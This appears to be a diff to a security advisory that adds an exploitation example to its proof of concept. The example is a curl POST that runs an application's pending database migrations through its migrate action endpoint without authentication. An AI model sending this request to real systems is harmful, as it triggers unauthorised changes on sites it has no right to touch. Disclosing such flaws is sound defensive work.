@@ -34,6 +34,17 @@ protected array|bool|int $allowAnonymous = [
 
 ## Proof of Concept
 
+
+### Exploitation:
+```bash
+curl -X POST "http://localhost/actions/app/migrate"
+```
+
+### Expected Result:
+- HTTP 200 OK
+- Pending migrations execute without authentication
+
+
 ```bash
 # With allowAdminChanges=false
 curl -X POST "http://target/actions/app/migrate"
